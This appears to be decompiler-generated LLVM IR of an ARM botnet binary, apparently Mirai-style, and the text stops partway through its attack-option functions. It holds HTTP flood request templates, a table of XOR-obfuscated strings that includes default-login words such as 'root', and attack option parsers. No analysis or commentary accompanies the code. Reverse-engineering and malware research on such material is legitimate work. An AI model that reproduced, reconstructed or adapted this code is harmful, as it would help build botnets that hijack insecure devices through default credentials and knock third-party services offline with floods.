source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_24474.23 = global i32 0
@global_var_e9fc.27 = constant i32 -382906384
@global_var_1509c.29 = constant i32 -382909968
@global_var_24698.33 = global i32 0
@global_var_d248.39 = constant i32 -382906384
@global_var_d6b4.41 = constant i32 -382906384
@global_var_c9bc.43 = constant i32 -382906384
@global_var_c2e4.45 = constant i32 -382906384
@global_var_bbc0.47 = constant i32 -382906384
@global_var_b394.49 = constant i32 -382906384
@global_var_ad34.51 = constant i32 -382906384
@global_var_88dc.54 = constant i32 -382906384
@global_var_1b3b8.56 = constant [4 x i8] c"GET\00"
@global_var_1b3bc.58 = constant i32 47
@global_var_16360.61 = constant i32 -450904024
@global_var_1b3b0.63 = constant i32 32
@global_var_1b388.65 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1b3a0.67 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_1b3ac.69 = constant [3 x i8] c"\0D\0A\00"
@global_var_1b3c0.71 = constant [9 x i8] c"Cookie: \00"
@global_var_1b3cc.73 = constant [3 x i8] c"; \00"
@global_var_1b3d8.75 = constant i32 59
@global_var_1b3d0.77 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_1b3dc.79 = constant [5 x i8] c"http\00"
@global_var_1b3e4.81 = constant [5 x i8] c"url=\00"
@global_var_1b3ec.83 = constant [5 x i8] c"POST\00"
@global_var_1b3f4.85 = constant i32 39
@global_var_12508.86 = constant i32 -439279616
@global_var_1bbb0.88 = constant i32 61
@global_var_271b8.90 = global i32 0
@global_var_2469c.101 = global i32 0
@global_var_271bc.105 = local_unnamed_addr global i32 0
@global_var_246a0.107 = global i32 0
@global_var_e764.110 = constant i32 -382910448
@global_var_24528.112 = global i32 75676
@global_var_271c4.116 = local_unnamed_addr global i32 0
@global_var_271c2.117 = local_unnamed_addr global i32 0
@global_var_24520.119 = global i32 -1
@global_var_246a4.124 = global i32 0
@global_var_1b3f8.132 = constant i32 10
@global_var_24524.134 = global i32 -1
@global_var_1279c.139 = constant i32 -382910352
@global_var_1b3fc.143 = constant i32 16777216
@global_var_246ac.145 = global i32 0
@global_var_246b8.147 = global i32 0
@global_var_246b0.149 = global i32 0
@global_var_246b4.151 = global i32 0
@global_var_271d8.161 = global i32 0
@global_var_246f0.163 = global i32 0
@global_var_246bc.165 = global i32 0
@global_var_246e8.167 = global i32 0
@global_var_271d0.174 = global i32 0
@global_var_271d4.176 = global i32 0
@global_var_246c2.179 = local_unnamed_addr global i32 0
@global_var_246d4.181 = global i32 0
@global_var_246c8.183 = local_unnamed_addr global i32 0
@global_var_246c4.184 = local_unnamed_addr global i32 0
@global_var_246c9.185 = local_unnamed_addr global i32 0
@global_var_246e2.188 = local_unnamed_addr global i32 0
@global_var_1b3d4.190 = constant i32 0
@global_var_1b778.192 = constant [5 x i8] c"PMMV\00"
@global_var_1b91c.194 = constant [6 x i8] c"CFOKL\00"
@global_var_1b404.196 = constant i32 387006810
@global_var_1b40c.198 = constant [6 x i8] c"TKXZT\00"
@global_var_1b414.200 = constant i32 437918234
@global_var_1b41c.202 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_1b424.204 = constant [8 x i8] c"FGDCWNV\00"
@global_var_1b42c.206 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_1b438.208 = constant i32 370216979
@global_var_1b440.210 = constant i32 269555223
@global_var_1b448.212 = constant [8 x i8] c"QWRRMPV\00"
@global_var_1b854.214 = constant i32 370216979
@global_var_1b450.216 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_1b45c.218 = constant i32 370216979
@global_var_1b464.220 = constant [5 x i8] c"WQGP\00"
@global_var_1b46c.222 = constant [5 x i8] c"RCQQ\00"
@global_var_1b474.224 = constant i32 1263486531
@global_var_1b5c8.226 = constant i32 320017171
@global_var_1b480.228 = constant [9 x i8] c"QOACFOKL\00"
@global_var_1b48c.230 = constant i32 336860180
@global_var_1b494.232 = constant i32 324292169
@global_var_1b49c.234 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1b4ac.236 = constant [7 x i8] c"OGKLQO\00"
@global_var_1b4b4.238 = constant [4 x i8] c"@WJ\00"
@global_var_1b4b8.240 = constant [7 x i8] c"RW@NKA\00"
@global_var_1b4c0.242 = constant [8 x i8] c"QGPTKAG\00"
@global_var_1b4c8.244 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_1b4d4.246 = constant [6 x i8] c"EWGQV\00"
@global_var_1b4dc.248 = constant i32 1263486531
@global_var_1b4e4.250 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_1b4f4.252 = constant [5 x i8] c"W@LV\00"
@global_var_1b4fc.254 = constant i32 324292169
@global_var_1b504.256 = constant i32 390551160
@global_var_1b50c.258 = constant i32 387009354
@global_var_1b514.260 = constant [6 x i8] c"HT@XF\00"
@global_var_1b51c.262 = constant [5 x i8] c"CLIM\00"
@global_var_1b524.264 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_1b52c.266 = constant [9 x i8] c"AJCLEGOG\00"
@global_var_1b538.268 = constant i32 1867011861
@global_var_1b548.270 = constant i32 1867011861
@global_var_1b558.272 = constant [7 x i8] c"Q[QVGO\00"
@global_var_1b560.274 = constant [5 x i8] c"KIU@\00"
@global_var_1b568.276 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_1b574.278 = constant [8 x i8] c"PGCNVGI\00"
@global_var_1b57c.280 = constant i32 303174162
@global_var_1b588.282 = constant i32 303174162
@global_var_1b590.284 = constant i32 320017171
@global_var_1b598.286 = constant i32 1263486531
@global_var_1b430.288 = constant [5 x i8] c"VGAJ\00"
@global_var_1b5a4.290 = constant i32 454761243
@global_var_1b5b0.292 = constant [6 x i8] c"oGKLQ\00"
@global_var_1b5b8.294 = constant [4 x i8] c"hta\00"
@global_var_1b5bc.296 = constant i32 319820054
@global_var_1b5c4.298 = constant i32 320017171
@global_var_1b5d0.300 = constant [7 x i8] c"WVQVCP\00"
@global_var_1b5d8.302 = constant [9 x i8] c"XMMOCFQN\00"
@global_var_1b5e4.304 = constant i32 1263486531
@global_var_1b5ec.306 = constant i32 303059531
@global_var_1b5f4.308 = constant i32 303125067
@global_var_1b5fc.310 = constant i32 303452747
@global_var_1b604.312 = constant [7 x i8] c"@KLVGA\00"
@global_var_1b60c.314 = constant [8 x i8] c"VQWLCOK\00"
@global_var_1b614.316 = constant i32 323043395
@global_var_1b61c.318 = constant i32 319951888
@global_var_1b624.320 = constant [7 x i8] c"Q[LLGV\00"
@global_var_1b62c.322 = constant [9 x i8] c"@C[CLFQN\00"
@global_var_1b638.324 = constant [6 x i8] c"SWQGP\00"
@global_var_1b730.326 = constant i32 1118227
@global_var_1b640.328 = constant i32 370216979
@global_var_1b648.330 = constant [8 x i8] c"oCLCEGP\00"
@global_var_1b650.332 = constant [4 x i8] c"CFO\00"
@global_var_1b654.334 = constant [8 x i8] c"OCLCEGP\00"
@global_var_1b65c.336 = constant [7 x i8] c"DPKGLF\00"
@global_var_1b664.338 = constant [4 x i8] c"CRA\00"
@global_var_1b668.340 = constant i32 1263421261
@global_var_1b674.342 = constant [5 x i8] c"VKLK\00"
@global_var_1b67c.344 = constant [7 x i8] c"CQAGLF\00"
@global_var_1b684.346 = constant i32 1265504102
@global_var_1b68c.348 = constant [6 x i8] c"FNKLI\00"
@global_var_1b694.350 = constant [6 x i8] c"NMEKL\00"
@global_var_1b69c.352 = constant i32 1296912387
@global_var_1b6a4.354 = constant [9 x i8] c"AC@NGAMO\00"
@global_var_1b6b0.356 = constant [7 x i8] c"PMWVGP\00"
@global_var_1b6b8.358 = constant [8 x i8] c"LGVMRKC\00"
@global_var_1b6c0.360 = constant [7 x i8] c"Q[QCFO\00"
@global_var_1b6c8.362 = constant [8 x i8] c"CLKAWQV\00"
@global_var_1b6d0.364 = constant [6 x i8] c"FG@WE\00"
@global_var_1b6d8.366 = constant [10 x i8] c"F\0CG\0C@\0CW\0CE\00"
@global_var_1b6e4.368 = constant [5 x i8] c"GAJM\00"
@global_var_1b6ec.370 = constant [5 x i8] c"FKCE\00"
@global_var_1b6f4.372 = constant [7 x i8] c"QUKVAJ\00"
@global_var_1b6c4.374 = constant [3 x i8] c"FO\00"
@global_var_1b6fc.376 = constant [7 x i8] c"VGNLGV\00"
@global_var_1b704.378 = constant i32 370216979
@global_var_1b710.380 = constant [5 x i8] c"VMMP\00"
@global_var_1b718.382 = constant [7 x i8] c"ACNTKL\00"
@global_var_1b720.384 = constant i32 370216979
@global_var_1b72c.386 = constant i32 1447906640
@global_var_1b734.388 = constant i32 1447512643
@global_var_1b740.390 = constant i32 454302484
@global_var_1b748.392 = constant i32 387400530
@global_var_1b754.394 = constant i32 319885331
@global_var_1b75c.396 = constant i32 1986882928
@global_var_1b764.398 = constant [7 x i8] c"CNRKLG\00"
@global_var_1b76c.400 = constant i32 457659992
@global_var_1b774.402 = constant i32 303043392
@global_var_1b780.404 = constant [9 x i8] c"rcqqumpf\00"
@global_var_1b78c.406 = constant [6 x i8] c"cfokl\00"
@global_var_1b794.408 = constant [8 x i8] c"LGVEGCP\00"
@global_var_1b79c.410 = constant i32 303257172
@global_var_1b7a4.412 = constant [4 x i8] c"K@O\00"
@global_var_1b7a8.414 = constant [7 x i8] c"T[CVVC\00"
@global_var_1b7b0.416 = constant [6 x i8] c"cFOKL\00"
@global_var_1b7b8.418 = constant i32 373380675
@global_var_1b7c0.420 = constant [7 x i8] c"OKAPMQ\00"
@global_var_1b7c8.422 = constant [6 x i8] c"QGVWR\00"
@global_var_1b7d0.424 = constant [8 x i8] c"AMOACQV\00"
@global_var_1b7d8.426 = constant [4 x i8] c"RMQ\00"
@global_var_1b7dc.428 = constant [4 x i8] c"UUU\00"
@global_var_1b7e0.430 = constant i32 303176208
@global_var_1b7e8.432 = constant [5 x i8] c"w`lv\00"
@global_var_1b7f0.434 = constant [7 x i8] c"LGVOCL\00"
@global_var_1b7f8.436 = constant [6 x i8] c"Cfokl\00"
@global_var_1b800.438 = constant [7 x i8] c"FCGOML\00"
@global_var_1b808.440 = constant [5 x i8] c"FGOM\00"
@global_var_1b810.442 = constant [6 x i8] c"CPPKQ\00"
@global_var_1b818.444 = constant [8 x i8] c"nKLIQ[Q\00"
@global_var_1b820.446 = constant [7 x i8] c"ANKGLV\00"
@global_var_1b828.448 = constant [6 x i8] c"AKQAM\00"
@global_var_1b830.450 = constant [6 x i8] c"akqam\00"
@global_var_1b838.452 = constant [6 x i8] c"QWRGP\00"
@global_var_1b840.454 = constant [5 x i8] c"QWPV\00"
@global_var_1b848.456 = constant i32 370611221
@global_var_1b5dc.458 = constant [5 x i8] c"CFQN\00"
@global_var_1b850.460 = constant i32 1313949251
@global_var_1b85c.462 = constant [7 x i8] c"RCVPMN\00"
@global_var_1b864.464 = constant i32 387007823
@global_var_1b86c.466 = constant [7 x i8] c"OGPNKL\00"
@global_var_1b874.468 = constant [9 x i8] c"LGVCFOKL\00"
@global_var_1b880.470 = constant [9 x i8] c"JGUNRCAI\00"
@global_var_1b88c.472 = constant [7 x i8] c"lGVkaQ\00"
@global_var_1b894.474 = constant i32 1179729984
@global_var_1b8a0.476 = constant [5 x i8] c"lwnn\00"
@global_var_1b8a8.478 = constant [9 x i8] c"CFOKLVVF\00"
@global_var_1b8b4.480 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_1b8c0.482 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_1b8cc.484 = constant i32 269488144
@global_var_1b8d8.486 = constant [9 x i8] c"QGAWPKV[\00"
@global_var_1b8e4.488 = constant [9 x i8] c"OMWLVQ[Q\00"
@global_var_1b8f0.490 = constant [8 x i8] c"OGOMVGA\00"
@global_var_1b8f8.492 = constant i32 1464562030
@global_var_1b908.494 = constant i32 2003334929
@global_var_1b918.496 = constant [10 x i8] c"OWQGCFOKL\00"
@global_var_1b924.498 = constant i32 1196513135
@global_var_1b930.500 = constant [10 x i8] c"QVMPUCVAJ\00"
@global_var_1b93c.502 = constant [11 x i8] c"QRGAKCNKQV\00"
@global_var_1b948.504 = constant [10 x i8] c"CFOKLRNFV\00"
@global_var_1b954.506 = constant [10 x i8] c"RNFVCFOKL\00"
@global_var_1b960.508 = constant i32 1279478337
@global_var_1b96c.510 = constant [13 x i8] c"VGNGAMOCFOKL\00"
@global_var_1b97c.512 = constant [13 x i8] c"CFOKLVGNGAMO\00"
@global_var_1b98c.514 = constant [7 x i8] c"EWGQV\22\00"
@global_var_1b994.516 = constant i32 336675162
@global_var_1b99c.518 = constant [9 x i8] c"FGDCWNV\22\00"
@global_var_1b9a8.520 = constant [8 x i8] c"CLVQNS\22\00"
@global_var_1b9b0.522 = constant [12 x i8] c"QWRGPTKQMP\22\00"
@global_var_1b9bc.524 = constant i32 1178819416
@global_var_1b9c8.526 = constant [6 x i8] c"PMMV\22\00"
@global_var_246cc.527 = local_unnamed_addr global i32 0
@global_var_246ca.528 = local_unnamed_addr global i32 0
@global_var_246d0.529 = local_unnamed_addr global i32 0
@global_var_246d8.531 = local_unnamed_addr global i32 0
@global_var_246e4.532 = local_unnamed_addr global i32 0
@global_var_f384.540 = constant i32 -382910352
@global_var_1b9d7.543 = constant i32 2096127
@global_var_1b9ce.545 = constant i32 2095871
@global_var_271e0.552 = global i32 0
@global_var_24530.555 = global i32 1043935
@global_var_1b9dc.560 = constant [3 x i8] c"=*\00"
@global_var_271f0.561 = local_unnamed_addr global i32 0
@global_var_271f4.562 = local_unnamed_addr global i32 0
@global_var_1b9e0.564 = constant i32 55430
@global_var_27200.565 = local_unnamed_addr global i32 0
@global_var_27204.566 = local_unnamed_addr global i32 0
@global_var_1b9e4.568 = constant i32 1499028601
@global_var_27208.569 = local_unnamed_addr global i32 0
@global_var_2720c.570 = local_unnamed_addr global i32 0
@global_var_1ba04.572 = constant i32 1380928786
@global_var_27210.573 = local_unnamed_addr global i32 0
@global_var_27214.574 = local_unnamed_addr global i32 0
@global_var_1ba0c.576 = constant i32 1480939538
@global_var_2721c.577 = local_unnamed_addr global i32 0
@global_var_27218.578 = local_unnamed_addr global i32 0
@global_var_1ba14.580 = constant i32 1029266194
@global_var_27220.581 = local_unnamed_addr global i32 0
@global_var_27224.582 = local_unnamed_addr global i32 0
@global_var_1ba1c.584 = constant i32 1380928786
@global_var_2722c.585 = local_unnamed_addr global i32 0
@global_var_27228.586 = local_unnamed_addr global i32 0
@global_var_1ba2c.588 = constant i32 1297895442
@global_var_27230.589 = local_unnamed_addr global i32 0
@global_var_27234.590 = local_unnamed_addr global i32 0
@global_var_1ba34.592 = constant i32 1548307986
@global_var_27238.593 = local_unnamed_addr global i32 0
@global_var_2723c.594 = local_unnamed_addr global i32 0
@global_var_1ba40.596 = constant i32 1414749203
@global_var_27240.597 = local_unnamed_addr global i32 0
@global_var_27244.598 = local_unnamed_addr global i32 0
@global_var_1ba48.600 = constant i32 1380928786
@global_var_27248.601 = local_unnamed_addr global i32 0
@global_var_2724c.602 = local_unnamed_addr global i32 0
@global_var_1ba5c.604 = constant i32 1380928786
@global_var_27254.605 = local_unnamed_addr global i32 0
@global_var_27250.606 = local_unnamed_addr global i32 0
@global_var_1ba6c.608 = constant i32 1920627327
@global_var_27258.609 = local_unnamed_addr global i32 0
@global_var_2725c.610 = local_unnamed_addr global i32 0
@global_var_1ba78.612 = constant i32 1581864978
@global_var_27260.613 = local_unnamed_addr global i32 0
@global_var_27264.614 = local_unnamed_addr global i32 0
@global_var_1ba8c.616 = constant i32 1599867994
@global_var_27268.617 = local_unnamed_addr global i32 0
@global_var_2726c.618 = local_unnamed_addr global i32 0
@global_var_1baa4.620 = constant [9 x i8] c"\5CNNJROY=\00"
@global_var_27270.621 = local_unnamed_addr global i32 0
@global_var_27274.622 = local_unnamed_addr global i32 0
@global_var_1bab0.624 = constant i32 1264081170
@global_var_27278.625 = local_unnamed_addr global i32 0
@global_var_2727c.626 = local_unnamed_addr global i32 0
@global_var_1bac0.628 = constant i32 1264081170
@global_var_27280.629 = local_unnamed_addr global i32 0
@global_var_27284.630 = local_unnamed_addr global i32 0
@global_var_1bad4.632 = constant i32 1264081170
@global_var_27288.633 = local_unnamed_addr global i32 0
@global_var_2728c.634 = local_unnamed_addr global i32 0
@global_var_1baec.636 = constant i32 1264081170
@global_var_27294.637 = local_unnamed_addr global i32 0
@global_var_27290.638 = local_unnamed_addr global i32 0
@global_var_1bb08.640 = constant i32 1264081170
@global_var_27298.641 = local_unnamed_addr global i32 0
@global_var_2729c.642 = local_unnamed_addr global i32 0
@global_var_1bb18.644 = constant [7 x i8] c"NUXQQ=\00"
@global_var_272a0.645 = local_unnamed_addr global i32 0
@global_var_272a4.646 = local_unnamed_addr global i32 0
@global_var_1bb20.648 = constant [8 x i8] c"XS\5C_QX=\00"
@global_var_272a8.649 = local_unnamed_addr global i32 0
@global_var_272ac.650 = local_unnamed_addr global i32 0
@global_var_1bb28.652 = constant [8 x i8] c"NDNIXP=\00"
@global_var_272b0.653 = local_unnamed_addr global i32 0
@global_var_272b4.654 = local_unnamed_addr global i32 0
@global_var_1bb30.656 = constant [4 x i8] c"NU=\00"
@global_var_272bc.657 = local_unnamed_addr global i32 0
@global_var_272b8.658 = local_unnamed_addr global i32 0
@global_var_1bb34.660 = constant i32 1398038290
@global_var_272c0.661 = local_unnamed_addr global i32 0
@global_var_272c4.662 = local_unnamed_addr global i32 0
@global_var_1bb4c.664 = constant i32 1499028569
@global_var_272c8.665 = local_unnamed_addr global i32 0
@global_var_272cc.666 = local_unnamed_addr global i32 0
@global_var_1bb6c.668 = constant [10 x i8] c"S^ROOX^I=\00"
@global_var_272d0.669 = local_unnamed_addr global i32 0
@global_var_272d4.670 = local_unnamed_addr global i32 0
@global_var_272d8.671 = local_unnamed_addr global i32 0
@global_var_272dc.672 = local_unnamed_addr global i32 0
@global_var_1bb78.674 = constant [6 x i8] c"RZTS=\00"
@global_var_272e0.675 = local_unnamed_addr global i32 0
@global_var_1bb80.677 = constant [7 x i8] c"XSIXO=\00"
@global_var_272e8.678 = local_unnamed_addr global i32 0
@global_var_1bb88.680 = constant i32 1398038290
@global_var_272f0.681 = local_unnamed_addr global i32 0
@global_var_1bb9c.683 = constant i32 1398038290
@global_var_272f8.684 = local_unnamed_addr global i32 0
@global_var_1bbb4.686 = constant i32 1213361769
@global_var_27300.687 = local_unnamed_addr global i32 0
@global_var_1bbcc.689 = constant i32 1581864978
@global_var_27308.690 = local_unnamed_addr global i32 0
@global_var_1bbe0.692 = constant [12 x i8] c"S\5CPXNXOKXO=\00"
@global_var_27310.693 = local_unnamed_addr global i32 0
@global_var_1bbec.695 = constant i32 1397969534
@global_var_27318.696 = local_unnamed_addr global i32 0
@global_var_1bf10.698 = constant i32 1482579580
@global_var_27320.699 = local_unnamed_addr global i32 0
@global_var_1bf64.701 = constant i32 1482579580
@global_var_27328.702 = local_unnamed_addr global i32 0
@global_var_1bc04.704 = constant i32 1230197374
@global_var_27330.705 = local_unnamed_addr global i32 0
@global_var_1bc38.707 = constant i32 2118735950
@global_var_27338.708 = local_unnamed_addr global i32 0
@global_var_1bc48.710 = constant i32 1331386447
@global_var_27340.711 = local_unnamed_addr global i32 0
@global_var_1bc54.713 = constant i32 1549685329
@global_var_27348.714 = local_unnamed_addr global i32 0
@global_var_1bc60.716 = constant i32 273242190
@global_var_27350.717 = local_unnamed_addr global i32 0
@global_var_1bc70.719 = constant i32 1230197342
@global_var_27358.720 = local_unnamed_addr global i32 0
@global_var_1bc84.722 = constant i32 1398558537
@global_var_27360.723 = local_unnamed_addr global i32 0
@global_var_1bc98.725 = constant [9 x i8] c"^UHSVXY=\00"
@global_var_27368.726 = local_unnamed_addr global i32 0
@global_var_1bbf8.728 = constant i32 1297635414
@global_var_27370.729 = local_unnamed_addr global i32 0
@global_var_1bca4.731 = constant i32 1397969502
@global_var_27378.732 = local_unnamed_addr global i32 0
@global_var_1bcb4.734 = constant i32 1263491150
@global_var_27380.735 = local_unnamed_addr global i32 0
@global_var_1bcc8.737 = constant i32 1263491150
@global_var_27388.738 = local_unnamed_addr global i32 0
@global_var_1bce4.740 = constant i32 1413960304
@global_var_27390.741 = local_unnamed_addr global i32 0
@global_var_1bd58.743 = constant i32 1413960304
@global_var_27398.744 = local_unnamed_addr global i32 0
@global_var_1bdcc.746 = constant i32 1413960304
@global_var_273a0.747 = local_unnamed_addr global i32 0
@global_var_1be1c.749 = constant i32 1413960304
@global_var_273a8.750 = local_unnamed_addr global i32 0
@global_var_1be90.752 = constant i32 1413960304
@global_var_273b0.753 = local_unnamed_addr global i32 0
@global_var_273b8.754 = local_unnamed_addr global i32 0
@global_var_273c0.755 = local_unnamed_addr global i32 0
@global_var_273c8.756 = local_unnamed_addr global i32 0
@global_var_1bf04.758 = constant [11 x i8] c"YKOuXQMXO=\00"
@global_var_273d0.759 = local_unnamed_addr global i32 0
@global_var_11748.761 = constant i32 -476053472
@global_var_24478.766 = global i32 0
@global_var_114ac.776 = constant i32 -1442840534
@global_var_132d4.790 = constant i32 -443088884
@global_var_11084.796 = constant i32 -481165277
@global_var_10fb4.799 = constant i32 167772168
@global_var_10f7c.801 = constant i32 324206650
@global_var_10e44.809 = constant i32 -481099766
@global_var_1376c.811 = constant i32 -456978431
@global_var_1405c.855 = constant i32 -478871519
@global_var_14b00.872 = constant i32 -478805983
@global_var_14ee8.882 = constant i32 -382906384
@global_var_16de0.892 = constant i32 -442544040
@global_var_1566c.911 = constant i32 -369098502
@global_var_16040.925 = constant i32 -382910288
@global_var_161f0.938 = constant i32 -2020859901
@global_var_162dc.942 = constant i32 -494075872
@global_var_13180.943 = constant i32 -382910336
@global_var_27760.947 = local_unnamed_addr global i32 0
@global_var_15318.961 = constant i32 -442543860
@global_var_136d0.969 = constant i32 -369093278
@global_var_172d8.995 = constant i32 -382910352
@global_var_d3f8.1003 = constant i32 -443744204
@global_var_186e8.1017 = constant i32 -382906384
@global_var_181a8.1045 = constant i32 -382910448
@global_var_19b98.1046 = constant i32 -382909968
@global_var_1a2d4.1107 = constant i32 -481296376
@global_var_1a3cc.1108 = constant i32 -481296376
@global_var_1a450.1109 = constant i32 -369098732
@global_var_24678.13 = external global i8*
@global_var_24694.31 = external global i8*
@global_var_24695.37 = global i8 0
@global_var_271c0.114 = global i16* null
@1 = internal constant [2 x i8] c"\01\00"
@global_var_2452c.121 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_246a8.137 = external global i8*
@global_var_246ec.169 = global i16* null
@global_var_246c0.178 = external global i8*
@global_var_246e0.182 = local_unnamed_addr global i8 0
@global_var_246d6.186 = local_unnamed_addr global i16 0
@global_var_246e1.187 = local_unnamed_addr global i8 0
@global_var_244d0.762 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_24678.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_24678.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_24678.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_24474.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_24474.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_24474.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e9fc.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 111464, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
